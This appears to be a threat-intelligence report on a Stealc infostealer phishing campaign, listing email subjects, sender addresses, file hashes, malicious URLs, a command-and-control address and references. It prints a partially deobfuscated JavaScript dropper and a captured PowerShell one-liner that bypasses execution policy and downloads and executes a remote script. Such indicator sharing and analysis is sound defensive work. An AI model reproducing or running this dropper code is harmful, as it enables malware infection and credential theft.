THREAT IDENTIFICATION: STEALC

INFECTION FLOW
pdf -> html -> php -> zip -> js -> txt (PS) -> exe

EMAIL SUBJECTS
Invoice #153216DFHF Payment Confirmation and Appreciation.
Invoice #522169JBW Payment Confirmation and Appreciation.
Invoice #55683RSNC Payment Confirmation and Appreciation.
Invoice #66578163WYL Payment Confirmation and Appreciation.
Invoice #9617219NJTS Payment Confirmation and Appreciation.
Invoice #96938SLMT Payment Confirmation and Appreciation.

EMAIL SENDERS
noreply-cb4899@lecourtconsulting.com
noreply-jawwad@lecourtconsulting.com
noreply-nikhilkumar@lecourtconsulting.com
noreply-riddhi.shah@lecourtconsulting.com
noreply-sanaa.mahyoub@lecourtconsulting.com
noreply-zyshanmit@venetosegreto.com

PDF FILE HASH
ReDC_2278822788.pdf
8f88eeecea60c0bb5d80e5e880f6708b

ZIP FILE REDIRECT URL
https://mimsmehediclub.com/download.html

ZIP FILE DOWNLOAD URL
https://mimsmehediclub.com/download.php

ZIP FILE HASH
att.file.downloaded_234.zip
8674ff1a3b99f9a9c296c64e80546645

JAVASCRIPT FILE HASH
att.file.downloaded_234.js
bac20cfe7e6dc608aad567ab885d4f19

PARTIALLY DEOBFUSCATED JAVASCRIPT
function _0x325c2f(_0x44d3c7, _0xfcfa68) {
  return _0x25e0(_0x44d3c7 - -901, _0xfcfa68)
}
;(function (_0x5d9443, _0x2a0a2f) {
  function _0x1407c5(_0x4e2931, _0x10e784) {
    return _0x25e0(_0x4e2931 - -76, _0x10e784)
  }
  var _0x7d05d1 = _0x5d9443()
  while (true) {
    try {
      var _0x4877c6 =
        -parseInt(_0x1407c5(302, 289)) / 1 +
        (-parseInt(_0x1407c5(323, 313)) / 2) *
          (-parseInt(_0x1407c5(288, 276)) / 3) +
        (-parseInt(_0x1407c5(310, 312)) / 4) *
          (parseInt(_0x1407c5(318, 313)) / 5) +
        -parseInt(_0x1407c5(304, 295)) / 6 +
        -parseInt(_0x1407c5(316, 299)) / 7 +
        parseInt(_0x1407c5(321, 338)) / 8 +
        (parseInt(_0x1407c5(301, 313)) / 9) *
          (parseInt(_0x1407c5(298, 297)) / 10)
      if (_0x4877c6 === _0x2a0a2f) {
        break
      } else {
        _0x7d05d1.push(_0x7d05d1.shift())
      }
    } catch (_0x36f16e) {
      _0x7d05d1.push(_0x7d05d1.shift())
    }
  }
})(_0x3cef, 536908)
function _0x25e0(_0x22d414, _0x5b2e51) {
  var _0x352723 = _0x3cef()
  _0x25e0 = function (_0x432165, _0x1e58c1) {
    _0x432165 = _0x432165 - 364
    var _0x294a9 = _0x352723[_0x432165]
    return _0x294a9
  }
  return _0x25e0(_0x25e0, _0x22d414, _0x5b2e51)
}
var _0x1a2b = new ActiveXObject(
  'WScr' + _0x325c2f(-535, -532) + _0x325c2f(-518, -513)
)
function _0x3cef() {
  var _0x5187a4 = [
    'ssion (New-Object Net.WebClient).Down',
    'file -Com',
    '18bwYlSk',
    '170462UjdgkZ',
    'e.txt',
    '1879356tGmiEw',
    'powershell -Ex',
    '[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; ',
    'ell',
    'Popup',
    'licy Bypass -NoPro',
    '52EWIUHF',
    'Echo',
    'ecutionPo',
    'led by user.',
    'ps://erp.wes',
    'ke-Ex',
    '1047844rcoLoZ',
    'loadSt',
    '387855mmnuoK',
    'Run',
    'getm',
    '2706424LRVTMT',
    'marines.com/',
    '361972igFPuB',
    '6wiEvQA',
    'pre',
    'ipt.Sh',
    'This file will be ope',
    'ad. Click OK to c',
    'htt',
    "ring('",
    'mand "',
    'ned with Notep',
    'ontinue.',
    '7392180QUxFpF',
  ]
  _0x3cef = function () {
    return _0x5187a4
  }
  return _0x3cef(_0x3cef)
}
var _0x3c4d =
    _0x325c2f(-532, -518) +
    _0x325c2f(-511, -528) +
    _0x325c2f(-503, -518) +
    _0x325c2f(-505, -515) +
    _0x325c2f(-522, -515),
  _0x5e6f = _0x1a2b[_0x325c2f(-517, -531)](
    _0x325c2f(-534, -544) +
      _0x325c2f(-529, -526) +
      _0x325c2f(-533, -518) +
      _0x325c2f(-528, -522),
    0,
    '',
    49
  )
if (_0x5e6f === 1) {
  var _0x7b8c =
      'Invo' +
      _0x325c2f(-510, -524) +
      _0x325c2f(-536, -519) +
      _0x325c2f(-526, -543) +
      _0x325c2f(-508, -497) +
      _0x325c2f(-531, -542) +
      _0x3c4d +
      "')",
    _0x9a1b = _0x325c2f(-519, -523) + _0x7b8c,
    _0xc3e2 =
      _0x325c2f(-520, -527) +
      _0x325c2f(-513, -503) +
      _0x325c2f(-516, -528) +
      _0x325c2f(-525, -533) +
      _0x325c2f(-530, -518) +
      _0x9a1b +
      '"'
  _0x1a2b[_0x325c2f(-506, -524)](_0xc3e2, 0, true)
} else {
  WScript[_0x325c2f(-514, -516)]('Operation cance' + _0x325c2f(-512, -501))
}

CAPTURED POWERSHELL
"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -ExecutionPolicy Bypass -NoProfile -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-Expression (New-Object Net.WebClient).DownloadString('https://erp.wesmarines.com/getme.txt')"

POWERSHELL DROPPER DOWNLOAD URL
https://erp.wesmarines.com/getme.txt

ZIP FILE HASH
d.zip
3859aabec735477f07705e4bdb39ddfe

PAYLOAD FILE HASH
d.exe
bda164229deba9581da386c060171b58

LIKELY C2
POST http://109.107.181.33/de4846fc29f26952.php

DOWNLOADED HELPER FILES
http://109.107.181.33/742d3278227bff91/sqlite3.dll
http://109.107.181.33/742d3278227bff91/freebl3.dll
http://109.107.181.33/742d3278227bff91/mozglue.dll
http://109.107.181.33/742d3278227bff91/msvcp140.dll
http://109.107.181.33/742d3278227bff91/nss3.dll
http://109.107.181.33/742d3278227bff91/softokn3.dll
http://109.107.181.33/742d3278227bff91/vcruntime140.dll

REFERENCES
https://urlhaus.abuse.ch/url/2748373/
https://tria.ge/240112-x9qgwaegh6

https://blog.sekoia.io/stealc-a-copycat-of-vidar-and-raccoon-infostealers-gaining-in-popularity-part-1/
https://www.vmray.com/cyber-security-blog/stealc-a-new-stealer-emerges-in-2023/
https://medium.com/@farghly.mahmod66/stealc-stealer-analysis-c623f8c6a143
